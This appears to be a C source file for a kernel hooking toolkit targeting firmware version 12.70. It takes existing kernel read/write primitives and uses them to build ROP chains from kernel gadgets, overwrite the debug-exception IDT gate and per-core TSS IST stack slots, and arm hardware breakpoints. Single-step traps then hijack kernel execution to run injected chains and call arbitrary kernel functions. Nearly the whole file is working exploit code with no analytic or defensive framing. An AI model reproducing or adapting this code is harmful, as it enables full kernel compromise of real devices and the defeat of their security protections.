#include "khook.h"

#ifdef AP_1270_PRESTAGE
#include <string.h>

_Static_assert(KH_1270_FALLBACK_OFF >= KH_SCRATCH_MIN,
               "fallback stacks overlap the 12.70 arm chain");
_Static_assert(KH_1270_FALLBACK_OFF + KH_1270_FALLBACK_SIZE <= KH_OFF_BIG_CHAIN,
               "fallback stacks overlap the 12.70 handler chain");
#endif

static int kwrite_q(khook_t *kh, uint64_t addr, uint64_t val)
{
  return kh->write(addr, &val, 8);
}

static uint64_t kread_q(khook_t *kh, uint64_t addr)
{
  uint64_t val = 0;
  kh->read(addr, &val, 8);
  return val;
}

static size_t putq(uint8_t *buf, size_t off, uint64_t val)
{
  for (int i = 0; i < 8; i++)
    buf[off + i] = (uint8_t)(val >> (8 * i));
  return off + 8;
}

static void gate_encode(uint64_t off, uint16_t sel, uint8_t ist, uint8_t type, uint8_t dpl, int present, uint64_t *lo, uint64_t *hi)
{
  *lo = (off & 0xFFFF)
      | ((uint64_t)sel << 16)
      | ((uint64_t)(ist & 7) << 32)
      | ((uint64_t)(type & 0xF) << 40)
      | ((uint64_t)(dpl & 3) << 45)
      | ((uint64_t)(present ? 1 : 0) << 47)
      | (((off >> 16) & 0xFFFF) << 48);
  *hi = (off >> 32) & 0xFFFFFFFFULL;
}

static int probe_write(khook_t *kh, uint64_t addr)
{
  uint64_t save;
  uint64_t readback;
  if (kh->read(addr, &save, 8) != 0)
    return 0;
  uint64_t test = save ^ 0xA5A5A5A5A5A5A5A5ULL;
  if (kwrite_q(kh, addr, test) != 0)
    return 0;
  if (kh->read(addr, &readback, 8) != 0) {
    kwrite_q(kh, addr, save);
    return 0;
  }
  if (kwrite_q(kh, addr, save) != 0)
    return 0;
  return readback == test;
}

static uint64_t ist_slot_va(const khook_t *kh)
{
  return kh->tss_base + (uint64_t)kh->core_id * kh->tss_stride + KH_TSS_IST(kh->ist_index);
}

#ifdef AP_1270_PRESTAGE
static uint64_t ist_slot_core(const khook_t *kh, unsigned core)
{
  return kh->tss_base + (uint64_t)core * kh->tss_stride + KH_TSS_IST(kh->ist_index);
}

/* Check the 12.70 TSS layout before touching an IST slot or the shared gate. */
static int census_1270(khook_t *kh)
{
  uint64_t rsp0[KH_1270_NCPU], ist4[KH_1270_NCPU];

  if (kh->core_id != 0 ||
      kh->tss_stride != KH_TSS_STRIDE || kh->ist_index != 6 ||
      ((kh->saved_gate_lo >> 32) & 7) != 4)
    return -1;

  for (unsigned core = 0; core < KH_1270_NCPU; core++) {
    uint64_t tss = kh->tss_base + (uint64_t)core * kh->tss_stride;
    if (kh->read(tss + 0x04, &rsp0[core], 8) != 0 ||
        kh->read(tss + KH_TSS_IST(4), &ist4[core], 8) != 0 ||
        kh->read(ist_slot_core(kh, core), &kh->saved_ists[core], 8) != 0 ||
        (rsp0[core] >> 47) != 0x1ffffULL || ist4[core] == 0 ||
        kh->saved_ists[core] != 0)
      return -2;
    for (unsigned prior = 0; prior < core; prior++)
      if (rsp0[core] == rsp0[prior] || ist4[core] == ist4[prior])
        return -3;
  }
  kh->saved_ist = kh->saved_ists[kh->core_id];
  return 0;
}

static uint64_t fallback_va(const khook_t *kh, unsigned core)
{
  return kh->scratch_base + KH_1270_FALLBACK_OFF +
         (uint64_t)(core - 1U) * KH_1270_FALLBACK_STRIDE;
}

static int prepare_fallbacks_1270(khook_t *kh)
{
  uint8_t stack[KH_1270_FALLBACK_STRIDE], readback[sizeof stack];

  for (unsigned core = 1; core < KH_1270_NCPU; core++) {
    uint64_t va = fallback_va(kh, core);
    memset(stack, 0, sizeof stack);
    putq(stack, 0x20, kgadget(KERNEL_GADGET_IRETQ));
    putq(stack, 0x50, kgadget(KERNEL_GADGET_POP_RSP));
    putq(stack, 0x58, va + 0x20);
    if (kh->write(va, stack, sizeof stack) != 0 ||
        kh->read(va, readback, sizeof readback) != 0 ||
        memcmp(stack, readback, sizeof stack) != 0)
      return -1;
  }
  return 0;
}
#endif

void kh_chain_init(kh_chain_t *chain, uint8_t *buf, size_t cap)
{
  chain->buf = buf;
  chain->cap = cap;
  chain->len = 0;
  chain->err = 0;
}

int kh_chain_q(kh_chain_t *chain, uint64_t raw)
{
  if (!chain || chain->err || chain->len + 8 > chain->cap) {
    if (chain)
      chain->err = 1;
    return -1;
  }

  putq(chain->buf, chain->len, raw);
  chain->len += 8;
  return 0;
}

int kh_chain_g(kh_chain_t *chain, kgadget_t gadget)
{
  return kh_chain_q(chain, kgadget(gadget));
}

int kh_chain_store(kh_chain_t *chain, uint64_t kaddr, uint64_t val)
{
  kh_chain_g(chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(chain, kaddr);
  kh_chain_g(chain, KERNEL_GADGET_POP_R8);
  kh_chain_q(chain, val);
  kh_chain_g(chain, KERNEL_GADGET_STORE_RCX_R8);
  return chain && !chain->err ? 0 : -1;
}

int kh_chain_memcpy(kh_chain_t *chain, uint64_t dst_kaddr, uint64_t src_kaddr, uint64_t n_bytes)
{
  kh_chain_g(chain, KERNEL_GADGET_CLD);        // DF=0 so rep movsb counts upward
  kh_chain_g(chain, KERNEL_GADGET_POP_RDI);
  kh_chain_q(chain, dst_kaddr);
  kh_chain_g(chain, KERNEL_GADGET_POP_RSI);
  kh_chain_q(chain, src_kaddr);
  kh_chain_g(chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(chain, n_bytes);
  kh_chain_g(chain, KERNEL_GADGET_REP_MOVSB);
  return chain && !chain->err ? 0 : -1;
}

int kh_chain_call(kh_chain_t *chain, uint64_t fn_kaddr, int argc, uint64_t a0, uint64_t a1, uint64_t a2)
{
  if (argc >= 1) {
    kh_chain_g(chain, KERNEL_GADGET_POP_RDI);
    kh_chain_q(chain, a0);
  }
  if (argc >= 2) {
    kh_chain_g(chain, KERNEL_GADGET_POP_RSI);
    kh_chain_q(chain, a1);
  }
  if (argc >= 3) {
    kh_chain_g(chain, KERNEL_GADGET_POP_RDX);
    kh_chain_q(chain, a2);
  }
  kh_chain_g(chain, KERNEL_GADGET_POP_RAX);
  kh_chain_q(chain, 0);
  kh_chain_q(chain, fn_kaddr);
  return chain && !chain->err ? 0 : -1;
}

int kh_init(khook_t *kh, kh_read_fn rd, kh_write_fn wr, uint64_t kernel_base, uint64_t scratch_base, int ist_index)
{
  if (!kh || !rd || !wr || !kernel_base || !scratch_base)
    return -1;
  if (scratch_base & 0xF)
    return -2;
  if (ist_index < 1 || ist_index > 7)
    return -3;

  for (unsigned i = 0; i < sizeof(*kh); i++)
    ((uint8_t *)kh)[i] = 0;

  kh->read = rd;
  kh->write = wr;
  kh->kernel_base = kernel_base;
  kh->scratch_base = scratch_base;
  kh->ist_index = ist_index;

  return 0;
}

void kh_set_hook_target(khook_t *kh, uint64_t kaddr) {
  if (kh)
    kh->hook_kaddr = kaddr;
}
void kh_set_resume_rip(khook_t *kh, uint64_t kaddr) {
  if (kh)
    kh->resume_rip = kaddr;
}
void kh_set_resume_skip(khook_t *kh, uint64_t skip) {
  if (kh)
    kh->resume_rip = skip ? kh->hook_kaddr + skip : 0;
}

void kh_set_resume_rax(khook_t *kh, uint64_t rax) {
  if (kh) {
    kh->resume_rax = rax;
    kh->resume_rax_set = 1;
  }
}

void kh_set_resume_rsi(khook_t *kh, uint64_t rsi) {
  if (kh) {
    kh->resume_rsi = rsi;
    kh->resume_rsi_set = 1;
  }
}

void kh_set_resume_rdi(khook_t *kh, uint64_t rdi) {
  if (kh) {
    kh->resume_rdi = rdi;
    kh->resume_rdi_set = 1;
  }
}

void kh_set_resume_rdx(khook_t *kh, uint64_t rdx) {
  if (kh) {
    kh->resume_rdx = rdx;
    kh->resume_rdx_set = 1;
  }
}

void kh_clear_resume_rax(khook_t *kh) {
  if (kh)
    kh->resume_rax_set = 0;
}

void kh_clear_resume_rsi(khook_t *kh) {
  if (kh)
    kh->resume_rsi_set = 0;
}

void kh_clear_resume_rdi(khook_t *kh) {
  if (kh)
    kh->resume_rdi_set = 0;
}

void kh_clear_resume_rdx(khook_t *kh) {
  if (kh)
    kh->resume_rdx_set = 0;
}

void kh_set_tables(khook_t *kh, uint64_t idt_base, uint64_t tss_base) {
  if (kh) {
    kh->idt_base = idt_base;
    kh->tss_base = tss_base;
  }
}

void kh_set_core(khook_t *kh, int core_id) {
  if (kh)
    kh->core_id = core_id;
}

uint64_t kh_user_data_addr(const khook_t *kh) {
  return kh ? kh->scratch_base + KH_OFF_USER : 0;
}

uint64_t kh_find_cave(khook_t *kh, uint64_t start, uint64_t len, size_t need)
{
  uint8_t buf[0x1000];
  uint64_t run = 0, run_start = 0;

  if (!kh)
    return 0;
  if (!need)
    need = KH_SCRATCH_MIN;

  need += 16;   // alignment

  for (uint64_t off = 0; off < len; off += sizeof buf) {
    size_t chunk = (len - off < sizeof buf) ? (size_t)(len - off) : sizeof buf;
    if (kh->read(start + off, buf, chunk) != 0) {
      run = 0;
      continue;
    }

    for (size_t i = 0; i < chunk; i++) {
      if (buf[i] != 0) {
        run = 0;
        continue;
      }
      if (run == 0)
        run_start = start + off + i;
      if (++run >= need)
        return (run_start + 0xF) & ~0xFULL;
    }
  }
  return 0;
}

static size_t emit_resume_tail(khook_t *kh, uint8_t *buf, size_t off,
                               uint64_t frame_base, uint64_t rflags_slot, uint64_t iret_tramp)
{
  if (kh->resume_rip) {
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RCX));
    off = putq(buf, off, frame_base);
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_R8));
    off = putq(buf, off, kh->resume_rip);
    off = putq(buf, off, kgadget(KERNEL_GADGET_STORE_RCX_R8));
  }

  if (kh->oneshot) {
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RAX));
    off = putq(buf, off, 0);
    off = putq(buf, off, kgadget(KERNEL_GADGET_SET_DR7)); // dr7 = 0 (disarm)
  } else {
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RCX));
    off = putq(buf, off, rflags_slot);
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RAX));
    off = putq(buf, off, KH_RF);
    off = putq(buf, off, kgadget(KERNEL_GADGET_OR_RCX_EAX)); // frame RFLAGS |= RF
  }

  if (kh->resume_rax_set) {
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RAX));
    off = putq(buf, off, kh->resume_rax);
  }
  if (kh->resume_rsi_set) {
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RSI));
    off = putq(buf, off, kh->resume_rsi);
  }
  if (kh->resume_rdi_set) {
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RDI));
    off = putq(buf, off, kh->resume_rdi);
  }
  if (kh->resume_rdx_set) {
    off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RDX));
    off = putq(buf, off, kh->resume_rdx);
  }

  off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RSP));
  off = putq(buf, off, iret_tramp);
  return off;
}

int kh_install(khook_t *kh, const kh_chain_t *handler)
{
  uint8_t img[KH_SCRATCH_MIN];
  uint8_t bigbuf[0x600];
  uint64_t scratch, arm_chain, disp_chain, big;
  uint64_t frame_base, rflags_slot, iret_tramp;
  size_t iret_tramp_off, handler_len, off;
#ifndef AP_1270_PRESTAGE
  size_t save_len, restore_off;
  uint64_t slot_rdi, slot_rsi, slot_rdx;
#endif
  uint64_t db_gate, ist, lo, hi;

  if (!kh || kh->installed)
    return -1;
  if (!kh->hook_kaddr)
    return -2;
  if (handler && handler->err)
    return -11;
  if (!kh->idt_base || !kh->tss_base)
    return -3;

  db_gate = kh->idt_base + 16 * KH_VEC_DB;
  ist = ist_slot_va(kh);

  if (kh->read(db_gate, &kh->saved_gate_lo, 8) != 0 ||
      kh->read(db_gate + 8, &kh->saved_gate_hi, 8) != 0 ||
      kh->read(ist, &kh->saved_ist, 8) != 0)
    return -4;
  kh->kcs           = (uint16_t)(kh->saved_gate_lo >> 16);
  if (!kh->kcs)
    return -4;

  {
    uint64_t gate_handler = (kh->saved_gate_lo & 0xFFFF)
                          | (((kh->saved_gate_lo >> 48) & 0xFFFF) << 16)
                          | ((kh->saved_gate_hi & 0xFFFFFFFFULL) << 32);
    if (!((kh->saved_gate_lo >> 47) & 1))
      return -14;

    if (gate_handler < kh->kernel_base ||
        gate_handler >= kh->kernel_base + KH_KIMG_MAX)
      return -14;
  }

#ifdef AP_1270_PRESTAGE
  if (census_1270(kh) != 0)
    return -17;
  gate_encode(kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET), kh->kcs,
              kh->ist_index, KH_GATE_INTERRUPT, 0, 1, &lo, &hi);
  if (hi != kh->saved_gate_hi)
    return -18;
#endif

  // Check if TSS RSP is valid-looking
  {
    uint64_t rsp0;
    if (kh->read(kh->tss_base + (uint64_t)kh->core_id * kh->tss_stride + 0x04,
                 &rsp0, 8) != 0 || (rsp0 >> 47) != 0x1FFFFULL)
      return -15;
  }

  scratch    = kh->scratch_base;
  arm_chain  = scratch + KH_OFF_CHAIN_ARM;
  disp_chain = scratch + KH_OFF_CHAIN_DISP;

  frame_base     = disp_chain - 0x28;
  rflags_slot    = frame_base + 0x10;
  iret_tramp     = frame_base - 8;
  iret_tramp_off = KH_OFF_CHAIN_DISP - 0x28 - 8;

  for (size_t i = 0; i < sizeof img; i++)
    img[i] = 0;

  {
#ifndef AP_1270_PRESTAGE
    uint64_t ctx_struct = scratch + KH_OFF_RESUME;
#endif
    uint64_t cont_chain = scratch + KH_OFF_CHAIN_CONT;

    off = KH_OFF_CHAIN_ARM;
    off = putq(img, off, kgadget(KERNEL_GADGET_POP_RAX));
    off = putq(img, off, kh->hook_kaddr);
#ifndef AP_1270_PRESTAGE
    off = putq(img, off, kgadget(KERNEL_GADGET_POP_RDI));
    off = putq(img, off, ctx_struct);
#endif
    off = putq(img, off, kgadget(KERNEL_GADGET_DBREG_RESUME));
    if (off > KH_OFF_CHAIN_CONT)
      return -5;

    // resumectx input struct: dr7 = execute-enable; dr1-3/dr6 = 0
    putq(img, KH_OFF_RESUME + KH_RC_RSP, cont_chain - 8);
    putq(img, KH_OFF_RESUME + KH_RC_RIP, kgadget(KERNEL_GADGET_RET_TRAMP));
    putq(img, KH_OFF_RESUME + KH_RC_DR7, KH_DR7_BP0_EXEC);

    off = KH_OFF_CHAIN_CONT;
#ifdef AP_1270_PRESTAGE
    off = putq(img, off, kgadget(KERNEL_GADGET_POP_RCX));
    off = putq(img, off, ist);
    off = putq(img, off, kgadget(KERNEL_GADGET_POP_RAX));
    off = putq(img, off, disp_chain);
    off = putq(img, off, kgadget(KERNEL_GADGET_ST_RCX_RAX));
#else
    off = putq(img, off, kgadget(KERNEL_GADGET_POP_RDI));
    off = putq(img, off, ist - 8);
    off = putq(img, off, kgadget(KERNEL_GADGET_POP_RCX));
    off = putq(img, off, disp_chain);
    off = putq(img, off, kgadget(KERNEL_GADGET_STORE_RDI8_RCX));
#endif
    off = putq(img, off, kgadget(KERNEL_GADGET_IRETQ));

    kh->arm_rip_slot = scratch + off;
    off = putq(img, off, 0);               // resume RIP
    off = putq(img, off, KH_USER_CS);
    off = putq(img, off, KH_RFLAGS_USER);
    kh->arm_rsp_slot = scratch + off;
    off = putq(img, off, 0);               // resume RSP
    off = putq(img, off, KH_USER_SS);
    if (off > KH_OFF_RESUME)
      return -5;
  }

  big = scratch + KH_OFF_BIG_CHAIN;
  if (!probe_write(kh, big))
    return -16;   // cave too small / unwritable

#ifdef AP_1270_PRESTAGE
  if (prepare_fallbacks_1270(kh) != 0)
    return -20;
#endif

  putq(img, iret_tramp_off, kgadget(KERNEL_GADGET_IRETQ));
  putq(img, KH_OFF_CHAIN_DISP + 0, kgadget(KERNEL_GADGET_POP_RSP));   // IST stub
  putq(img, KH_OFF_CHAIN_DISP + 8, big);

  for (size_t i = 0; i < sizeof bigbuf; i++)
    bigbuf[i] = 0;

#ifndef AP_1270_PRESTAGE
  save_len    = 0x58;
#endif
  handler_len = (handler && handler->len) ? handler->len : 0;
#ifdef AP_1270_PRESTAGE
#ifndef AP_1270_STORE_HANDLER
  if (handler_len)
    return -19;
#else
  // The 12.70 path appends a bounded chain after the gate/DR7 teardown.
  // Reserve room for the marker and the resume tail before copying it.
  if (handler_len > sizeof bigbuf - 0x100)
    return -19;
#endif
#endif
#ifndef AP_1270_PRESTAGE
  restore_off = save_len + handler_len;
  slot_rdi = big + restore_off + 0x08;
  slot_rsi = big + restore_off + 0x18;
  slot_rdx = big + restore_off + 0x28;
#endif

  off = 0;
#ifdef AP_1270_PRESTAGE
  /* Do not leave the shared gate or DR0 active while staging the AP code.
   * All fallback IST6 stacks remain intact until userland cleanup. */
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RCX));
  off = putq(bigbuf, off, db_gate);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RAX));
  off = putq(bigbuf, off, kh->saved_gate_lo);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_ST_RCX_RAX));
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RAX));
  off = putq(bigbuf, off, 0);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_SET_DR7));
#endif
#if defined(AP_1270_PRESTAGE) && defined(AP_1270_SECOND_MARKER)
  // Leave a marker before the one-shot resume tail.
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RCX));
  off = putq(bigbuf, off, scratch + KH_OFF_USER);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RAX));
  off = putq(bigbuf, off, 0x1270DBDB5EEDBEEFULL);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_ST_RCX_RAX));
#endif
#if defined(AP_1270_PRESTAGE) && defined(AP_1270_STORE_HANDLER)
  if (off + handler_len + 0xa0 > sizeof bigbuf)
    return -19;
  for (size_t i = 0; i < handler_len; i++)
    bigbuf[off + i] = handler->buf[i];
  off += handler_len;
#endif
#ifndef AP_1270_PRESTAGE
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_MOV_RAX_RSI));   // rax = rsi
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RCX));
  off = putq(bigbuf, off, slot_rsi);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_ST_RCX_RAX));    // [slot_rsi] = rsi
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RCX));
  off = putq(bigbuf, off, slot_rdx);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_ST_RCX_RDX));    // [slot_rdx] = rdx
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_MOV_RAX_RDI));   // rax = rdi
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RCX));
  off = putq(bigbuf, off, slot_rdi);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_ST_RCX_RAX));    // [slot_rdi] = rdi
  if (handler_len) {
    for (size_t i = 0; i < handler_len; i++)
      bigbuf[off + i] = handler->buf[i];
    off += handler_len;
  }

  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RDI));
  off = putq(bigbuf, off, 0);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RSI));
  off = putq(bigbuf, off, 0);
  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RDX));
  off = putq(bigbuf, off, 0);
#endif

  off = emit_resume_tail(kh, bigbuf, off, frame_base, rflags_slot, iret_tramp);
  if (off > sizeof bigbuf)
    return -6;
  if (kh->write(big, bigbuf, off) != 0)
    return -7;

  if (kh->write(scratch, img, sizeof img) != 0)
    return -7;

#ifdef AP_1270_PRESTAGE
  /* The stock gate still uses IST4. Publish every IST6 path before the
   * replacement gate, and leave the selected core's arm path for last. */
  kh->installed = 1;
  for (unsigned core = 1; core < KH_1270_NCPU; core++) {
    uint64_t top = fallback_va(kh, core) + 0x50;
    if (kwrite_q(kh, ist_slot_core(kh, core), top) != 0 ||
        kread_q(kh, ist_slot_core(kh, core)) != top)
      return -21;
  }
  if (kwrite_q(kh, ist, arm_chain) != 0 || kread_q(kh, ist) != arm_chain)
    return -8;
  if (kwrite_q(kh, db_gate, lo) != 0)
    return -10;
  if (kread_q(kh, db_gate) != lo ||
      kread_q(kh, db_gate + 8) != hi)
    return -12;
#else
  if (kwrite_q(kh, ist, arm_chain) != 0) {
    kwrite_q(kh, ist, kh->saved_ist);
    return -8;
  }

  gate_encode(kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET), kh->kcs, kh->ist_index,
              KH_GATE_INTERRUPT, 0, 1, &lo, &hi);
  if (kwrite_q(kh, db_gate + 8, hi) != 0) {
    kwrite_q(kh, ist, kh->saved_ist);
    return -9;
  }
  if (kwrite_q(kh, db_gate, lo) != 0) {
    kwrite_q(kh, db_gate + 8, kh->saved_gate_hi);
    kwrite_q(kh, ist, kh->saved_ist);
    return -10;
  }

  if (kread_q(kh, ist) != arm_chain ||
      kread_q(kh, db_gate) != lo || kread_q(kh, db_gate + 8) != hi) {
    kwrite_q(kh, db_gate + 8, kh->saved_gate_hi);
    kwrite_q(kh, db_gate, kh->saved_gate_lo);
    kwrite_q(kh, ist, kh->saved_ist);
    return -12;
  }

  kh->installed = 1;
#endif
  return 0;
}

int kh_trigger(khook_t *kh)
{
  uint64_t resume_rsp, rbp_val;
  void *resume_label = &&resumed;

  if (!kh || !kh->installed)
    return -1;

  __asm__ volatile("mov %%rsp, %0" : "=r"(resume_rsp));
  __asm__ volatile("mov %%rbp, %0" : "=r"(rbp_val));

  if (kwrite_q(kh, kh->scratch_base + KH_OFF_RESUME + KH_RC_RBP, rbp_val) != 0 ||
      kwrite_q(kh, kh->arm_rip_slot, (uint64_t)resume_label) != 0 ||
      kwrite_q(kh, kh->arm_rsp_slot, resume_rsp) != 0)
    return -2;

#ifdef AP_1270_PRESTAGE
  // The 12.70 arm chain starts at DBREG_RESUME. Supply its context in
  // RDI before single stepping so it never executes the 12.70 NX POP_RDI.
  uint64_t ctx_struct = kh->scratch_base + KH_OFF_RESUME;
  __asm__ volatile(
      "mov %[ctx], %%rdi    \n\t"
      "pushfq             \n\t"
      "orq $0x100, (%%rsp)\n\t"
      "popfq              \n\t"
      "nop                \n\t"
      : : [ctx] "r"(ctx_struct) : "rdi", "memory", "cc");
#else
  __asm__ volatile(
      "pushfq             \n\t"
      "orq $0x100, (%%rsp)\n\t"   // set TF
      "popfq              \n\t"
      "nop                \n\t"   // single-step #DB
      ::: "memory", "cc");
#endif
resumed:
  return 0;
}

int kh_disarm(khook_t *kh)
{
  uint8_t buf[0x60];
  uint64_t scratch, ist;
  size_t off;

  if (!kh || !kh->installed)
    return -1;

  scratch = kh->scratch_base;
  ist = ist_slot_va(kh);

  for (unsigned i = 0; i < sizeof buf; i++)
    buf[i] = 0;

  off = 0;
  off = putq(buf, off, kgadget(KERNEL_GADGET_POP_RAX));
  off = putq(buf, off, 0);
  off = putq(buf, off, kgadget(KERNEL_GADGET_SET_DR7));   // dr7 = 0
  off = putq(buf, off, kgadget(KERNEL_GADGET_IRETQ));
  kh->arm_rip_slot = scratch + KH_OFF_CHAIN_ARM + off;
  off = putq(buf, off, 0);
  off = putq(buf, off, KH_USER_CS);
  off = putq(buf, off, KH_RFLAGS_USER);
  kh->arm_rsp_slot = scratch + KH_OFF_CHAIN_ARM + off;
  off = putq(buf, off, 0);
  off = putq(buf, off, KH_USER_SS);
  if (kh->write(scratch + KH_OFF_CHAIN_ARM, buf, off) != 0)
    return -2;

  if (kwrite_q(kh, ist, scratch + KH_OFF_CHAIN_ARM) != 0)
    return -3;

  return kh_trigger(kh);
}

int kh_restore(khook_t *kh)
{
  uint64_t db_gate;
#ifndef AP_1270_PRESTAGE
  uint64_t ist;
#endif

  if (!kh || !kh->installed)
    return -1;

  db_gate = kh->idt_base + 16 * KH_VEC_DB;
#ifndef AP_1270_PRESTAGE
  ist = ist_slot_va(kh);
#endif

#ifdef AP_1270_PRESTAGE
  /* Gate first: no CPU can enter the replacement handler while its IST is
   * being restored.  The high gate qword was required to stay unchanged. */
  uint64_t gate_lo = 0, gate_hi = 0;
  if (kwrite_q(kh, db_gate, kh->saved_gate_lo) != 0 ||
      kh->read(db_gate, &gate_lo, 8) != 0 ||
      kh->read(db_gate + 8, &gate_hi, 8) != 0 ||
      gate_lo != kh->saved_gate_lo || gate_hi != kh->saved_gate_hi)
    return -2;
  for (unsigned core = 0; core < KH_1270_NCPU; core++) {
    uint64_t slot = ist_slot_core(kh, core);
    uint64_t observed = UINT64_MAX;
    if (kwrite_q(kh, slot, kh->saved_ists[core]) != 0 ||
        kh->read(slot, &observed, 8) != 0 ||
        observed != kh->saved_ists[core])
      return -3;
  }
#else
  if (kwrite_q(kh, db_gate + 8, kh->saved_gate_hi) != 0 ||
      kwrite_q(kh, db_gate, kh->saved_gate_lo) != 0 ||
      kwrite_q(kh, ist, kh->saved_ist) != 0)
    return -2;
  uint64_t gate_hi, gate_lo, ist_value;
  if (kh->read(db_gate + 8, &gate_hi, 8) != 0 ||
      kh->read(db_gate, &gate_lo, 8) != 0 ||
      kh->read(ist, &ist_value, 8) != 0 ||
      gate_hi != kh->saved_gate_hi ||
      gate_lo != kh->saved_gate_lo || ist_value != kh->saved_ist)
    return -3;
#endif
  kh->installed = 0;
  return 0;
}
